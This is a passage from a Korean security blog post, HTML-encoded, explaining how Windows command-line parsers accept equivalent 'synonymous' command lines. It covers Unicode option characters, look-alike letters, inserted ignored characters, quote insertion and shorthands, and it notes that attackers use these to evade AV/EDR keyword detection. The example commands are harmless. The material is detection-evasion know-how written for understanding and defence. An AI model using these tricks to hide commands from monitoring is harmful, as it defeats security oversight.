&#xC6A9;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled.png" alt></p><p>&#xB77C;&#xC778; &#xC804;&#xCCB4;&#xAC00; command line&#xC774;&#xBA70; &#xACF5;&#xBC31;&#xC73C;&#xB85C; &#xC778;&#xC790;&#xAC00; &#xAD6C;&#xBD84;&#xB41C;&#xB2E4;. &#xBAA8;&#xB4E0; &#xC778;&#xC790;&#xB294; &#xC5ED;&#xD560;&#xC774; &#xB2E4;&#xB974;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB294; &#xBCF4;&#xD1B5; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC774;&#xBA70; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC758; &#xACBD;&#xC6B0; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xB41C;&#xB2E4;. &#xD2B9;&#xD788; &#xCC98;&#xC74C; &#xC138; &#xAC00;&#xC9C0;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; command line &#xC635;&#xC158;&#xC774;&#xB2E4;. &#xCC98;&#xC74C; &#xB450; &#xAC00;&#xC9C0; (<code>/f /unicode</code>)&#xB294; &#xD2B9;&#xBCC4;&#xD55C; &#xC785;&#xB825; &#xAC12;&#xC744; &#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; switch&#xC774;&#xACE0; &#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790; (<code>/decode</code>)&#xB294; &#xB4A4;&#xC758; &#xC778;&#xC790; (<code>folder\encoded.b64</code>)&#xAC00; &#xC774; &#xC778;&#xC790;&#xC5D0; &#xB300;&#xD55C; &#xC785;&#xB825; &#xAC12;&#xC778; flag&#xC774;&#xB2E4;.</p><p><code>option char</code>&#xB294; command-line options&#xC5D0;&#xC11C; prefix&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBB38;&#xC790;&#xC774;&#xB2E4;. Windows&#xC5D0;&#xC11C; &#xBCF4;&#xD1B5; &#xC2AC;&#xB798;&#xC2DC; (<code>/</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; &#xC720;&#xB2C9;&#xC2A4; &#xACC4;&#xC5F4; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xD558;&#xC774;&#xD47C; (<code>-</code>)&#xC744; &#xC4F4;&#xB2E4;. command line&#xC740; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xB418;&#xBBC0;&#xB85C; &#xAC1C;&#xBC1C;&#xC790;&#xB4E4;&#xC740; &#xC5B4;&#xB5A4; &#xD615;&#xC2DD;&#xC758; &#xC778;&#xC790;&#xB97C; &#xC804;&#xB2EC;&#xD574;&#xC57C; &#xD558;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xACE0;&#xBBFC;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB41C;&#xB2E4;.</p><p>&#xCEF4;&#xD4E8;&#xD130; &#xC5ED;&#xC0AC;&#xC5D0;&#xC11C; &#xD45C;&#xC900;&#xD654;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xB9E4;&#xC6B0; &#xD63C;&#xB780;&#xC2A4;&#xB7EC;&#xC6B4; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xB294;&#xB370; command line&#xC5D0;&#xB3C4; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;.</p><h1 id="&#xD638;&#xD658;&#xC131;-Compatibility"><a href="#&#xD638;&#xD658;&#xC131;-Compatibility" class="headerlink" title="&#xD638;&#xD658;&#xC131; (Compatibility)"></a>&#xD638;&#xD658;&#xC131; (Compatibility)</h1><p>command-line &#xAD6C;&#xBB38; &#xBD84;&#xC11D; &#xADDC;&#xCE59;&#xC5D0; &#xB300;&#xD55C; &#xD45C;&#xC900;&#xD654;&#xAC00; &#xBBF8;&#xD761;&#xD558;&#xC5EC; &#xB9CE;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xD63C;&#xB780;&#xC744; &#xC720;&#xBC1C;&#xD55C;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xB3D5;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xBA87;&#xBA87; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xADDC;&#xCE59;&#xC774; &#xD5C8;&#xC6A9;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; &#xC2AC;&#xB798;&#xC2DC;&#xC640; &#xD558;&#xC774;&#xD47C;&#xC744; &#xC635;&#xC158; &#xBB38;&#xC790;&#xB85C; &#xBAA8;&#xB450; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xB2E4;&#xC74C; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD55C;&#xB2E4;.</p><p>&#xD63C;&#xB780;&#xC758; &#xB2E4;&#xB978; &#xC694;&#xC778;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xBB38;&#xC790;&#xC5F4; &#xC778;&#xCF54;&#xB529;&#xC774;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xC624;&#xB798;&#xB41C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; (&#xBCF4;&#xD1B5; ASCII&#xB9CC; &#xD5C8;&#xC6A9;)&#xACFC; &#xCD5C;&#xC2E0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; (UTF-8&#xACFC; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xD5C8;&#xC6A9;) &#xAC04;&#xC758; &#xD638;&#xD658;&#xC131; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;. &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB97C; &#xD2B9;&#xC815; &#xBB38;&#xC790; &#xD544;&#xD130;&#xB9C1;&#xC774;&#xB098; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xB97C; ASCII &#xBB38;&#xC790;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xC5EC; &#xD574;&#xACB0;&#xD558;&#xACE0;&#xC790; &#xD55C;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; command line &#xC778;&#xC790;&#xB97C; &#xD558;&#xB098;&#xB85C; &#xB2E4;&#xB8E8;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC0DD;&#xAE34;&#xB2E4;. &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC804;&#xB2EC;&#xB41C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xB2E4;&#xB984;&#xC5D0;&#xB3C4; &#xC2E4;&#xD589; &#xBC0F; &#xACB0;&#xACFC;&#xB294; &#xB3D9;&#xC77C;&#xD55C;&#xB370;, &#xC774;&#xB7F0; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; synonymous command line&#xC774;&#xB77C;&#xACE0; &#xBD80;&#xB978;&#xB2E4;.</p><h1 id="&#xD0D0;&#xC9C0;-&#xBB38;&#xC81C;-Problems-for-detection"><a href="#&#xD0D0;&#xC9C0;-&#xBB38;&#xC81C;-Problems-for-detection" class="headerlink" title="&#xD0D0;&#xC9C0; &#xBB38;&#xC81C; (Problems for detection)"></a>&#xD0D0;&#xC9C0; &#xBB38;&#xC81C; (Problems for detection)</h1><p>&#xAC19;&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB2E4;&#xB978; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC77C;&#xBD80; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C;&#xB294; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC9C0;&#xB9CC; &#xD0D0;&#xC9C0;&#xB098; &#xAC10;&#xC9C0;&#xB97C; &#xC5B4;&#xB835;&#xAC8C; &#xD55C;&#xB2E4;. &#xB300;&#xBD80;&#xBD84; &#xC704;&#xD611; &#xD0D0;&#xC9C0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; (AV, EDR &#xB4F1;)&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2E4;&#xD589; &#xBC0F; command-line &#xC778;&#xC790;&#xC758; &#xC545;&#xC758;&#xC801; &#xC0AC;&#xC6A9;&#xC744; &#xAC10;&#xC2DC;&#xD55C;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xD0D0;&#xC9C0;&#xB97C; &#xD53C;&#xD558;&#xACE0; &#xC2F6;&#xC744; &#xAC83;&#xC774;&#xACE0; command line&#xC758; &#xC720;&#xC5F0;&#xC131;&#xC744; &#xD1B5;&#xD574; &#xD0D0;&#xC9C0;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB294; &#xD0A4;&#xC6CC;&#xB4DC; &#xAE30;&#xBC18; &#xD0D0;&#xC9C0; &#xC6B0;&#xD68C;&#xBD80;&#xD130; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB2E4; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xAE4C;&#xC9C0; &#xB2E4;&#xC591;&#xD558;&#xB2E4;.</p><p>command-line &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xC88B;&#xC740; &#xC608;&#xC2DC; &#xC911; &#xD558;&#xB098;&#xB294; Windows &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8; CMD&#xC5D0; &#xCD08;&#xC810;&#xC744; &#xB9DE;&#xCD98; Daniel Bohannon&#xC758; DOSfuscation [<a href="https://github.com/danielbohannon/Invoke-DOSfuscation">1</a>, <a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf">2</a>]&#xC774;&#xB2E4;. &#xB09C;&#xB3C5;&#xD654;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; CMD&#xAC00; &#xC774;&#xD574;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC0AC;&#xB78C;&#xC774; &#xC774;&#xD574;&#xD560; &#xC218; &#xC5C6;&#xC744; &#xC218; &#xC788;&#xACE0;, &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xB610;&#xD55C; &#xD0D0;&#xC9C0;&#xD558;&#xC9C0; &#xBABB;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>synonymous command line&#xC740; CMD &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB354; &#xB9CE;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;. &#xC911;&#xC694;&#xD55C; &#xCC28;&#xC774;&#xC810;&#xC740; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; &#xC2E4;&#xD589; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC790;&#xCCB4;&#xB97C; &#xC18D;&#xC774;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xB4A4;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774; DOSfuscation&#xC740; &#xD0D0;&#xC9C0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0; &#xC758;&#xD574; &#xB09C;&#xB3C5;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD615;&#xD0DC;&#xB85C; &#xB0A8;&#xC744; &#xC218; &#xC788;&#xC9C0;&#xB9CC; synonymous command line&#xC740; &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xB2E4;.</p><h1 id="Synonymous-command-lines-methods"><a href="#Synonymous-command-lines-methods" class="headerlink" title="Synonymous command lines: methods"></a>Synonymous command lines: methods</h1><p>&#xC2E4;&#xC81C;&#xB3C4; &#xC791;&#xB3D9;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; synonymous command line&#xC744; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xB294; 5 &#xAC00;&#xC9C0; &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC790;.</p><h2 id="Option-Char-substitution"><a href="#Option-Char-substitution" class="headerlink" title="Option Char substitution"></a>Option Char substitution</h2><p>Windows &#xC2E4;&#xD589; &#xD30C;&#xC77C; <code>ping</code>&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xC790;. &#xC6D0;&#xBCF8;&#xC774; &#xC720;&#xB2C9;&#xC2A4; &#xBC84;&#xC804;&#xC774;&#xBBC0;&#xB85C; command-line option&#xC5D0; &#xD558;&#xC774;&#xD47C;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. ( e.g. <code>ping -n 127.0.0.1</code>) &#xC774;&#xAC83;&#xC740; &#xC2AC;&#xB798;&#xC2DC; (<code>/</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB2E4;&#xB978; Windows command-line &#xD234;&#xACFC;&#xB294; &#xB2E4;&#xB974;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD63C;&#xB780;&#xC744; &#xC904;&#xC774;&#xAE30; &#xC704;&#xD574; option character&#xB85C; &#xC2AC;&#xB798;&#xC2DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83; (<code>ping /n 127.0.0.1</code>) &#xB610;&#xD55C; &#xD5C8;&#xC6A9;&#xD55C;&#xB2E4;.</p><p>&#xD558;&#xC774;&#xD47C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xAE30;&#xBCF8; &#xB0B4;&#xC7A5; Windows &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xB4E4;&#xC740; &#xC2AC;&#xB798;&#xC2DC;&#xB3C4; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, &#xADF8; &#xBC18;&#xB300;&#xB294; &#xC544;&#xB2CC; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xB2E4;. &#x2018;keyword&#x2019; &#xB2E8;&#xC5B4;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; <code>find /i keyword</code> &#xBA85;&#xB839;&#xC5B4;&#xB294; <code>find -i keyword</code>&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;.</p><p>&#xC2AC;&#xB798;&#xC2DC;&#xC640; &#xD558;&#xC774;&#xD47C;&#xC774; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xC635;&#xC158;&#xC774;&#xC9C0;&#xB9CC; &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB354; &#xB9CE;&#xC740; option character&#xB97C; &#xC9C0;&#xC6D0;&#xD55C;&#xB2E4;. <code>certutil</code>&#xC740; &#xD558;&#xC774;&#xD47C;, &#xC2AC;&#xB798;&#xC2DC; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; division slash (0x2215), fraction slash (0x2044) &#xAC19;&#xC740; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xC2AC;&#xB798;&#xC2DC;&#xB3C4; &#xD5C8;&#xC6A9;&#xD55C;&#xB2E4;.</p><p>&#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB4EF;&#xC774; &#xB300;&#xCCB4;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; command-line option&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xB4E4;&#xC740; &#xBB38;&#xC11C;&#xD654;&#xB97C; &#xC798; &#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xBB34;&#xCC28;&#xBCC4; &#xB300;&#xC785; (brute force)&#xB098; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xD1B5;&#xD574; &#xC54C;&#xC544;&#xB0B4;&#xC57C; &#xD55C;&#xB2E4;.</p><h2 id="Character-substitution"><a href="#Character-substitution" class="headerlink" title="Character substitution"></a>Character substitution</h2><p>&#xB610; &#xB2E4;&#xB978; &#xC811;&#xADFC;&#xBC95;&#xC740; command line&#xC5D0; &#xC788;&#xB294; &#xB2E4;&#xB978; &#xBB38;&#xC790; (option char&#xAC00; &#xC544;&#xB2CC; &#xBB38;&#xC790;)&#xB97C; &#xBE44;&#xC2B7;&#xD55C; &#xBB38;&#xC790;&#xB85C; &#xBC14;&#xAFB8;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xD2B9;&#xD788; &#xC720;&#xB2C8;&#xCF54;&#xB4DC;&#xC758; &#xBC94;&#xC704;&#xB97C; &#xACE0;&#xB824;&#xD560; &#xB54C; ASCII &#xBC94;&#xC704;&#xC5D0;&#xB3C4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xD5C8;&#xC6A9;&#xD558;&#xB294; &#xC5EC;&#xB7EC; &#xBB38;&#xC790;&#xAC00; &#xC788;&#xB2E4;.</p><p>&#xC720;&#xB2C8;&#xCF54;&#xB4DC;&#xC5D0;&#xB294; &#xACF5;&#xBC31; &#xBB38;&#xC790; (0x02B0 ~ 0x02FF)&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xACE0;, &#x2EA;, &#x2E3;, &#x2E2; &#xAC19;&#xC740; &#xBB38;&#xC790;&#xB3C4; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;. &#xC77C;&#xBD80; command-line parser&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB97C; l, x, s&#xB85C; &#xBCC0;&#xD658;&#xD55C;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; <code>reg export HKCU out.reg</code>&#xC640; <code>reg e&#x2E3;port HKCU out.reg</code>&#xB294; &#xAC19;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%201.png" alt></p><blockquote><p><code>e&#x2E3;port HKCU out.reg</code>&#xAC00; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC608;&#xC2DC;</p></blockquote><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xBC94;&#xC704;&#xAC00; &#xB354; &#xB9CE;&#xC544;&#xC84C;&#xB2E4;.</p><h2 id="Character-insertion"><a href="#Character-insertion" class="headerlink" title="Character insertion"></a>Character insertion</h2><p>&#xBE44;&#xC2B7;&#xD55C; &#xB9E5;&#xB77D;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xBB34;&#xC2DC;&#xD558;&#xB294; &#xBB38;&#xC790;&#xB97C; command-line&#xC5D0; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC77C;&#xBD80; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC740; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xBA70; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.</p><p>Windows &#xC774;&#xBCA4;&#xD2B8; &#xB85C;&#xADF8; &#xD234; <code>wevtutil</code>&#xC740; &#xD2B9;&#xC815; &#xBC94;&#xC704;&#xC758; &#xC720;&#xB2C8;&#xCF54;&#xB4DC; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD5C8;&#xC6A9;&#xD55C;&#xB2E4;. <code>wevtutil gli hardwareevents</code>&#xC640; <code>wevtutil g&#x8AF;li hardwareevents</code>&#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; &#xC911;&#xAC04;&#xC5D0; &#xC544;&#xB78D;&#xC5B4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB97C; &#xCD9C;&#xB825;&#xD55C;&#xB2E4;. </p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%202.png" alt></p><blockquote><p><code>wevtutil g&#x8AF;li hardwareevents</code>&#xAC00; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC608;&#xC2DC;</p></blockquote><p>&#xC774; &#xAE30;&#xBC95;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBB38;&#xC790;&#xAC00; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC758; stdin&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xBC14;&#xC774;&#xD2B8; &#xD45C;&#xAE30;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xBB38;&#xC790;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.</p><h2 id="Quotes-insertion"><a href="#Quotes-insertion" class="headerlink" title="Quotes insertion"></a>Quotes insertion</h2><p>quote &#xC30D;&#xC744; &#xC0BD;&#xC785;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD750;&#xB984;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xBA74;&#xC11C; command-line&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC778;&#xC790;&#xC5D0; quote&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC775;&#xC219;&#xD560; &#xAC83;&#xC774;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>dir &quot;C:\Windows\&quot;</code>&#xB294; <code>dir c:\Windows\</code>&#xC640; &#xAC19;&#xB2E4;. &#xB300;&#xBD80;&#xBD84; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC774;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xBA70; &#xC784;&#xC758;&#xC758; &#xC704;&#xCE58;&#xC5D0;&#xC11C; quote&#xB97C; &#xBC1B;&#xC544;&#xB4E4;&#xC778;&#xB2E4;. <code>dir c:&quot;win&quot;d&quot;&quot;ow&quot;s&quot;</code>&#xB3C4; &#xC791;&#xB3D9;&#xD55C;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%203.png" alt></p><blockquote><p><code>netsh ad&quot;vfi&quot;rewall show currentprofile state</code>&#xAC00; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC608;&#xC2DC;</p></blockquote><p>&#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; quote&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xC5EC; &#xAE4C;&#xB2E4;&#xB85C;&#xC6B8; &#xC218; &#xC788;&#xB2E4;. cmd&#xC5D0;&#xC11C; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xBAA8;&#xB4E0; quote&#xB97C; &#xB450; &#xBC30;&#xB85C; &#xB298;&#xB824; &#xC704;&#xC640; &#xAC19;&#xC774; &#xC2E4;&#xD589;&#xD558;&#xB824;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs jsx">netsh ad<span class="hljs-string">&quot;&quot;</span>vfi<span class="hljs-string">&quot;&quot;</span>rewall show currentprofile state</code></pre><h2 id="Shorthands"><a href="#Shorthands" class="headerlink" title="Shorthands"></a>Shorthands</h2><p>&#xBB38;&#xC790;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xACE0; &#xAD50;&#xCCB4;&#xD558;&#xACE0; &#xB098;&#xBA74; &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xAC70;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC77C;&#xBD80; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#x2018;shorthands&#x2019;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#xC27D;&#xAC8C; &#xC785;&#xB825;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xC774;&#xB294; Unix &#xACC4;&#xC5F4; &#xD234;&#xC5D0;&#xC11C;&#xB294; &#xC798; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC9C0;&#xB9CC; Windows&#xC5D0;&#xB294; &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xB2E4;. (<code>grep -i keyword</code> vs <code>grep --ignore-case keyword</code>) &#xD558;&#xC9C0;&#xB9CC; Windows&#xC758; &#xC77C;&#xBD80; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB2E8;&#xCD95;&#xC5B4;&#xAC00; &#xC788;&#xB2E4;. Unix&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xBC29;&#xC2DD;&#xC744; &#xD1B5;&#xD574; &#xD55C; &#xAE00;&#xC790;&#xB85C; &#xC904;&#xC774;&#xBA70; (<code>cmdkey /l</code> , <code>cmdkey /list</code>), &#xC57D;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. (<code>wevtutil gli</code>, <code>wevtutil get-loginfo</code>) &#xB610; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;&#xB294; wildcard &#xC811;&#xADFC;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. Powershell&#xC744; &#xC608;&#xB85C; &#xB4E4;&#xBA74; powershell&#xC758; &#xD0A4;&#xC6CC;&#xB4DC; &#xB05D;&#xC5D0; &#xD558;&#xB098; &#xC774;&#xC0C1;&#xC758; &#xBB38;&#xC790;&#xB97C; &#xB0A8;&#xAE38; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/01/idioth/windows_cmd_obfuscation/Untitled%204.png" alt></p><blockquote><p>13 &#xAC00;&#xC9C0;&#xC758; &#xB2E4;&#xB978; shorthand&#xAC00; &#xC788;&#xB2E4;.</p></blockquote><p>&#xC18C;&#xC218;&#xC758; &#xC0AC;&#xB78C;&#xB4E4;&#xB9CC;&#xC774; &#xC774;&#xB97C; &#xC774;&#xD574;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xD558;&#xACE0;, &#xB098;&#xBA38;&#xC9C0;&#xB294; &#xB354; &#xBCF5;&#xC7A1;&#xD574;&#xC9C4;&#xB2E4;. Powershell&#xC740; &#xB2E4;&#xB978; &#xBA85;&#xB839; 